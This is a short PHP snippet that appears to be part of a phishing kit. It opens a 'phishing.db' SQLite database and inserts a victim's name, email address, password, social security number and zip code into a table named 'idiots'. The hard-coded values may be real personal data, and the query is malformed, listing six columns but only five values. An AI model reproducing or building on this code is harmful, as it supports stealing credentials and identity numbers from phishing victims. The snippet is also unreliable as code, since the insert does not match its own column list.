<?php

$db->open('../sqlite3/phishing.db');

$db->exec('INSERT INTO idiots (first, last, email, password, ssn, zip) VALUES ("gavin","saul","chemist931@gmail.com","234556653","20112")');



?>
